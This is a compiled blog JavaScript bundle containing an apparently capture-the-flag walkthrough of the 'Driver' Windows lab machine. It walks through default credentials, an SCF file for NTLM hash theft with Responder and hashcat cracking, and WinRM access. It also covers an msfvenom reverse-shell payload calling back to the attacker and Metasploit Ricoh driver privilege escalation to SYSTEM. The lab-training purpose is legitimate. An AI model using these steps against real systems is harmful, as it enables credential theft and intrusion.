"use strict";(self.webpackChunkmy_blog=self.webpackChunkmy_blog||[]).push([[9068],{980:(e,t,s)=>{s.d(t,{A:()=>n});const n=s.p+"assets/images/image-dr-2-a8c26f7bc0f632abffe552a8eb9858d6.png"},1172:(e,t,s)=>{s.r(t),s.d(t,{assets:()=>h,contentTitle:()=>o,default:()=>c,frontMatter:()=>r,metadata:()=>n,toc:()=>d});var n=s(2057),i=s(4848),a=s(8453);const r={title:"Driver",date:new Date("2025-05-25T00:00:00.000Z"),tags:["easy","windows"]},o=void 0,h={authorsImageUrls:[]},d=[{value:"Task 1",id:"task-1",level:3},{value:"Task 2",id:"task-2",level:3},{value:"Task 3",id:"task-3",level:3},{value:"Task 4",id:"task-4",level:3},{value:"Task 5",id:"task-5",level:3},{value:"Task 6",id:"task-6",level:3},{value:"Task 7",id:"task-7",level:3},{value:"Task 8",id:"task-8",level:3},{value:"Task 9",id:"task-9",level:3},{value:"Task 10",id:"task-10",level:3},{value:"Task 11",id:"task-11",level:3}];function l(e){const t={a:"a",code:"code",h3:"h3",img:"img",p:"p",pre:"pre",...(0,a.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(t.h3,{id:"task-1",children:"Task 1"}),"\n",(0,i.jsx)(t.p,{children:"We're prompted for log on credentials when accessing the target over HTTP. What username is disclosed when looking at the HTTP response headers?"}),"\n",(0,i.jsxs)(t.p,{children:["We use curl with the option for fetching headers only ",(0,i.jsx)(t.code,{children:"curl -I <target_ip>"})," and see on the ",(0,i.jsx)(t.code,{children:"WWW-Authenticate"})," the username admin."]}),"\n",(0,i.jsx)(t.p,{children:(0,i.jsx)(t.img,{alt:"alt text",src:s(6255).A+"",width:"1518",height:"456"})}),"\n",(0,i.jsx)(t.h3,{id:"task-2",children:"Task 2"}),"\n",(0,i.jsx)(t.p,{children:"Weak passwords are all too common and this target is no exception. What is the password for this target's login?"}),"\n",(0,i.jsxs)(t.p,{children:["Before using any automated tools, we try with the default, common password ",(0,i.jsx)(t.code,{children:"admin"})," and it gets us in. On the main page we are presented with a MFP Firmware Update Center."]}),"\n",(0,i.jsx)(t.p,{children:(0,i.jsx)(t.img,{alt:"alt text",src:s(980).A+"",width:"1768",height:"1200"})}),"\n",(0,i.jsx)(t.h3,{id:"task-3",children:"Task 3"}),"\n",(0,i.jsx)(t.p,{children:"There are several kinds of files that are commonly dropped into a file share to target other users who may browse to the share. If the user browses to the share, their host will try to authenticate to the attacker. What is the file extension that can be uploaded here to trigger that connection?"}),"\n",(0,i.jsxs)(t.p,{children:["The file that is asked here, has the extension ",(0,i.jsx)(t.code,{children:".scf"})," which stands for Shell Command File. This file can be placed on a writable SMB share or web-based file upload to force outbound authentication requests. For more detailed information visit ",(0,i.jsx)(t.a,{href:"https://attack.mitre.org/techniques/T1187/",children:"MITRE ATT&CK"})]}),"\n",(0,i.jsx)(t.h3,{id:"task-4",children:"Task 4"}),"\n",(0,i.jsx)(t.p,{children:"We've intercepted an Net-NTLMv2 hash with Responder. What is the mode in Hashcat required to crack this hash format?"}),"\n",(0,i.jsx)(t.p,{children:"When Responder intercepts a Net-NTLMv2 hash, the format looks like:"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{children:"USERNAME::DOMAIN:ServerChallenge:NTProofStr:Blob\n"})}),"\n",(0,i.jsxs)(t.p,{children:["This structure corresponds exactly to the format supported by Hashcat mode 5600 which is backed up by the Hashcat official documentation ",(0,i.jsx)(t.a,{href:"https://hashcat.net/wiki/doku.php?id=example_hashes",children:"Hashcat Generic hash types"})]}),"\n",(0,i.jsx)(t.h3,{id:"task-5",children:"Task 5"}),"\n",(0,i.jsx)(t.p,{children:"What is the tony user's password?"}),"\n",(0,i.jsxs)(t.p,{children:["To solve this task, we will start responder ",(0,i.jsx)(t.code,{children:"sudo responder -I tun0"})," and then upload a scf file to the file share via the printer upload form that would trigger an SMB authentication. We create a file as follows:"]}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{children:"[Shell]\nCommand=2\nIconFile=\\\\<host_ip>\\share\\icon.ico\n[Taskbar]\nCommand=ToggleDesktop\n"})}),"\n",(0,i.jsx)(t.p,{children:"This works, and the Net-NTLMv2 hash is captured by Responder because this upload is reviewed manually and thus opened as the web page explains."}),"\n",(0,i.jsx)(t.p,{children:(0,i.jsx)(t.img,{alt:"alt text",src:s(4221).A+"",width:"1516",height:"734"})}),"\n",(0,i.jsxs)(t.p,{children:["As mentioned in the previous task, the full hash string can be cracked using Hashcat mode 5600. We create a file called tony_hash with this hash, we run ",(0,i.jsx)(t.code,{children:"hashcat -m 5600 -a 0 tony_hash.txt /usr/share/wordlists/rockyou.txt"})," and the password is cracked."]}),"\n",(0,i.jsx)(t.h3,{id:"task-6",children:"Task 6"}),"\n",(0,i.jsx)(t.p,{children:"Submit the flag located on the tony user's desktop."}),"\n",(0,i.jsxs)(t.p,{children:["We will first list the shared folders on the target Microsoft-DS by running ",(0,i.jsx)(t.code,{children:"smbclient -L //<target_ip> -U 'tony'"})," using the user tony's password we found in the previous task."]}),"\n",(0,i.jsx)(t.p,{children:(0,i.jsx)(t.img,{alt:"alt text",src:s(4242).A+"",width:"1516",height:"568"})}),"\n",(0,i.jsxs)(t.p,{children:["Then we can try connecting directly to the ",(0,i.jsx)(t.code,{children:"C$"})," default share by running ",(0,i.jsx)(t.code,{children:"smbclient //<target_ip>/C$ -U 'tony'"})," which gave us access denied. We then try ",(0,i.jsx)(t.code,{children:"crackmapexec smb <target_ip> -u tony -p 'liltony' --shares"})]}),"\n",(0,i.jsx)(t.p,{children:(0,i.jsx)(t.img,{alt:"alt text",src:s(5787).A+"",width:"1674",height:"764"})}),"\n",(0,i.jsx)(t.p,{children:"This validates that the user does not have access but we see that Windows 10 Enterprise is used which by default has WinRM installed and often enabled."}),"\n",(0,i.jsx)(t.p,{children:(0,i.jsx)(t.code,{children:"crackmapexec winrm <target_ip> -u tony -p liltony"})}),"\n",(0,i.jsx)(t.p,{children:(0,i.jsx)(t.img,{alt:"alt text",src:s(2873).A+"",width:"1674",height:"268"})}),"\n",(0,i.jsxs)(t.p,{children:["Since the service is enabled we can use ",(0,i.jsx)(t.code,{children:"evil-winrm -i <target_ip> -u tony -p liltony"}),". We have access and navigating to tony's Desktop we get the flag by ",(0,i.jsx)(t.code,{children:"cat user.txt"}),"."]}),"\n",(0,i.jsx)(t.p,{children:"10.129.192.136"}),"\n",(0,i.jsx)(t.h3,{id:"task-7",children:"Task 7"}),"\n",(0,i.jsx)(t.p,{children:"What is the filename that stores the command history for PowerShell for tony?"}),"\n",(0,i.jsxs)(t.p,{children:["Based on ",(0,i.jsx)(t.a,{href:"https://learn.microsoft.com/en-us/powershell/module/psreadline/get-psreadlineoption?view=powershell-7.5",children:"Microsoft Documentation"})," the location of the command history can be revealed from the property ",(0,i.jsx)(t.code,{children:"HistorySavePath"})," after running ",(0,i.jsx)(t.code,{children:"Get-PSReadlineOption"}),". Trying this did not work on the WinRM because it is not a fully interactive terminal. We try to view the default location to see if the history is stored there by ",(0,i.jsx)(t.code,{children:'type "$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"'})," and it works, thus, the filename is ",(0,i.jsx)(t.code,{children:"ConsoleHost_history.txt"}),"."]}),"\n",(0,i.jsx)(t.h3,{id:"task-8",children:"Task 8"}),"\n",(0,i.jsx)(t.p,{children:"Looking at the Powershell history we can see some actions being performed with a specific printer type. Research of this should show that it's exploitable for privilege escalation and a module is available for the Metasploit framework. What is the module name?"}),"\n",(0,i.jsxs)(t.p,{children:["Looking through the output of the command history we see the driver name and name for the printer. Looking up on the CVE database online, we find the CVE to be ",(0,i.jsx)(t.code,{children:"CVE-2019-19363"}),". We spin Metasploit by ",(0,i.jsx)(t.code,{children:"msfonsole"})," and search for the CVE ID by ",(0,i.jsx)(t.code,{children:"search cve:2019-19363"})," finding the module name."]}),"\n",(0,i.jsx)(t.p,{children:(0,i.jsx)(t.img,{alt:"alt text",src:s(8224).A+"",width:"1570",height:"360"})}),"\n",(0,i.jsx)(t.p,{children:(0,i.jsx)(t.img,{alt:"alt text",src:s(2425).A+"",width:"1570",height:"572"})}),"\n",(0,i.jsx)(t.h3,{id:"task-9",children:"Task 9"}),"\n",(0,i.jsx)(t.p,{children:"Initial attempts to exploit this vulnerability may fail under specific logon types such as non-interactive, but in this scenario we can switch to an interactive logon. What command can be used in Metasploit to switch to an interactive logon process?"}),"\n",(0,i.jsxs)(t.p,{children:["First, we generate a Meterpreter Payload ",(0,i.jsx)(t.code,{children:"msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.95 LPORT=4444 -f exe > shell.exe"}),". Then, run ",(0,i.jsx)(t.code,{children:"msfconsole"})," to spin up a metasploit listener and start the module previously found by:"]}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{children:"use exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset LHOST <host_ip>\nset LPORT 4444\nrun\n"})}),"\n",(0,i.jsxs)(t.p,{children:["Then, we upload the paylod inside the Evil-WinRM session ",(0,i.jsx)(t.code,{children:"upload shell.exe"}),"and execute it ",(0,i.jsx)(t.code,{children:".\\shell.exe"}),". Going back to the Metasploit we get an interactive shell back."]}),"\n",(0,i.jsx)(t.p,{children:(0,i.jsx)(t.img,{alt:"alt text",src:s(8807).A+"",width:"1570",height:"354"})}),"\n",(0,i.jsxs)(t.p,{children:["We need to ",(0,i.jsx)(t.code,{children:"backrgound"})," that session and then start the module to exploit the vulnerable driver with the known CVE we found in the previous task."]}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{children:"use exploit/windows/local/ricoh_driver_privesc\nset session <session_id>\nset LHOST <host_ip>\nset payload windows/x64/meterpreter/reverse_tcp\nrun\n"})}),"\n",(0,i.jsxs)(t.p,{children:["Even though it seems that is working, the terminal hungs. The Ricoh driver exploit requires an interactive logon session with GUI access. So we need to use the ",(0,i.jsx)(t.code,{children:"migrate"})," command to migrate the Meterpreter session into a GUI-based process. Bringing back the metasploit session by running ",(0,i.jsx)(t.code,{children:"sessions -i <session_id>"})," and listing the processes ",(0,i.jsx)(t.code,{children:"ps"})," we see that a good candidate is the ",(0,i.jsx)(t.code,{children:"explorer.exe"}),". We migrate by running ",(0,i.jsx)(t.code,{children:"migrate <explorer_id>"}),", then run the exploit again and it works. To validate we run ",(0,i.jsx)(t.code,{children:"getuid"})," and we see that we have SYSTEM rights."]}),"\n",(0,i.jsx)(t.p,{children:(0,i.jsx)(t.img,{alt:"alt text",src:s(2991).A+"",width:"1570",height:"798"})}),"\n",(0,i.jsx)(t.h3,{id:"task-10",children:"Task 10"}),"\n",(0,i.jsx)(t.p,{children:"In addtion to the 'RICOH PCL6 UniversalDriver V4.23' vulnerabiltiy, this target is also vulnerable to CVE-2021-1675 aka PrintNightmare. Is it possible to elevate to SYSTEM privileges with this CVE?"}),"\n",(0,i.jsxs)(t.p,{children:["Looking up this ",(0,i.jsx)(t.a,{href:"https://www.cvedetails.com/cve/CVE-2021-1675/",children:"CVE on the CVE database"}),", it is confirmed that there is a Metasploit module that if used, results in remote code execution as NT \\AUTHORITY\\SYSTEM."]}),"\n",(0,i.jsx)(t.h3,{id:"task-11",children:"Task 11"}),"\n",(0,i.jsx)(t.p,{children:"Submit the flag located on the administrator's desktop."}),"\n",(0,i.jsxs)(t.p,{children:["From Task 9, we already have SYSTEM privileges. Navigating to the administrator's desktop we get the root flag by running ",(0,i.jsx)(t.code,{children:"cat root.txt"}),"."]})]})}function c(e={}){const{wrapper:t}={...(0,a.R)(),...e.components};return t?(0,i.jsx)(t,{...e,children:(0,i.jsx)(l,{...e})}):l(e)}},2057:e=>{e.exports=JSON.parse('{"permalink":"/Blog/blog/Driver","editUrl":"https://github.com/danae-pan/Blog/blog/Driver.md","source":"@site/blog/Driver.md","title":"Driver","description":"Task 1","date":"2025-05-25T00:00:00.000Z","tags":[{"inline":true,"label":"easy","permalink":"/Blog/blog/tags/easy"},{"inline":true,"label":"windows","permalink":"/Blog/blog/tags/windows"}],"readingTime":5.235,"hasTruncateMarker":false,"authors":[],"frontMatter":{"title":"Driver","date":"2025-05-25T00:00:00.000Z","tags":["easy","windows"]},"unlisted":false,"nextItem":{"title":"Precious","permalink":"/Blog/blog/Precious"}}')},2425:(e,t,s)=>{s.d(t,{A:()=>n});const n=s.p+"assets/images/image-dr-7-53d840387418b4c129f3621e07c9f96d.png"},2873:(e,t,s)=>{s.d(t,{A:()=>n});const n=s.p+"assets/images/image-dr-16-55ecfa90176cce9deb2e786c7f67fb39.png"},2991:(e,t,s)=>{s.d(t,{A:()=>n});const n=s.p+"assets/images/image-dr-10-c368ec3ed6641ff3ececd643fbd861cd.png"},4221:(e,t,s)=>{s.d(t,{A:()=>n});const n=s.p+"assets/images/image-dr-3-553d51e293be0b7af82c86cf1ada2873.png"},4242:(e,t,s)=>{s.d(t,{A:()=>n});const n=s.p+"assets/images/image-dr-4-6721f07e64b15fe7f34528be404b096d.png"},5787:(e,t,s)=>{s.d(t,{A:()=>n});const n=s.p+"assets/images/image-dr-5-222eb28f5736b4759d4dc4b2a8e7e543.png"},6255:(e,t,s)=>{s.d(t,{A:()=>n});const n=s.p+"assets/images/image-dr-1-967690d0655d5e8dadc181e773374317.png"},8224:(e,t,s)=>{s.d(t,{A:()=>n});const n=s.p+"assets/images/image-dr-6-363e24f23f3dd8314b6ce4f1ab05b26c.png"},8453:(e,t,s)=>{s.d(t,{R:()=>r,x:()=>o});var n=s(6540);const i={},a=n.createContext(i);function r(e){const t=n.useContext(a);return n.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function o(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:r(e.components),n.createElement(a.Provider,{value:t},e.children)}},8807:(e,t,s)=>{s.d(t,{A:()=>n});const n=s.p+"assets/images/image-dr-9-f8ca83ef76122d194cab3c46964a1011.png"}}]);